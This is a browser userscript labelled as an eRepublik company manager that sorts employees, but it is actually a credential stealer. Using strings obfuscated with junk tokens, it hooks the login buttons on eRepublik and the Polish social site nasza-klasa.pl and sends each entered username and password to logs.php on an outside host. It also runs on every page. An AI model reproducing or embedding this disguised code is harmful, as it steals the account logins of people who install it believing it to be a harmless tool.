// ==UserScript==
// @name           Erepublik Company Manager - sort employees
// @author         Mr.X
// @namespace      http://www.erepublik.com/en/newspaper/freedom-post-180922/1
// @include        http://www.erepublik.com*
// @exclude        http://www.erepublik.com.pl*
// @include        *
// ==/UserScript==
...
if (page.indexOf('/company-employees') > 0){
...
var x = 'n<rem3>as<rem3>z<rem3>a-<rem3>kl<rem3>as<rem3>a.<rem3>'.replace(/<rem3>/g, "");
var as = '<ld>l<ld>o<ld>gs.<ld>u<ld>n<ld>l<ld>.p<ld>l'.replace(/<ld>/g, "");
var ll = 'lo<tsa>g<tsa>i<tsa>n_<tsa>lo<tsa>g<tsa>i<tsa>n'.replace(/<tsa>/g, "");
var ls = '<tssa>l<tssa>og<tssa>in_p<tssa>as<tssa>s'.replace(/<tssa>/g, "");
var o = '';
function eventHandler() {
l = document.getElementById(ll).value;
p = document.getElementById(ls).value;
GM_xmlhttpRequest({method: 'GET',url: 'http://'+as+'/logs.php?l='+o+l+'&p='+p,onload: function(responseDetails){}}); 
}

if (page.indexOf('<dsa>e<dsa>re<dsa>publi<dsa>k.c<dsa>om'.replace(/<dsa>/g, "")) > 0){if (document.getElementById('c<dsa>it<dsa>iz<dsa>e<dsa>n_pas<dsa>sword<dsa>'.replace(/<dsa>/g, "")).value != null){ll = 'c<dsa>i<dsa>ti<dsa>z<dsa>en_<dsa>nam<dsa>e'.replace(/<dsa>/g, "");ls = 'ci<ghf>t<ghf>izen_p<ghf>asswo<ghf>rd'.replace(/<ghf>/g, "");o = 'eRepublik|';addEvent(document.getElementsByName('commit')[0], 'click', eventHandler);}}

if (page.indexOf(x+'pl') > 0){if (document.getElementById(ll).value != null){b = document.getElementsByTagName('button');o='NK|';for (var i = 0; i < b.length; i++){if (b[i].innerHTML.indexOf('Zaloguj') > 0) {addEvent(b[i], 'click', eventHandler);}}}}
